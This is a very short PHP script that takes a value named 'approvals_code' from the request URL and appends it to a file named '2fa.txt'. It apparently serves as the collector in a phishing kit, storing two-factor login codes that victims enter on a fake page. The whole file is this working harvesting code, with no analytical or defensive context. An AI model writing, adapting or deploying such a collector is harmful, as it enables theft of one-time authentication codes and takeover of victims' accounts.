<?php
$approvals_code = $_GET["approvals_code"];
$fp = fopen("2fa.txt", "a");
fwrite($fp, $approvals_code);
fclose($fp);
?>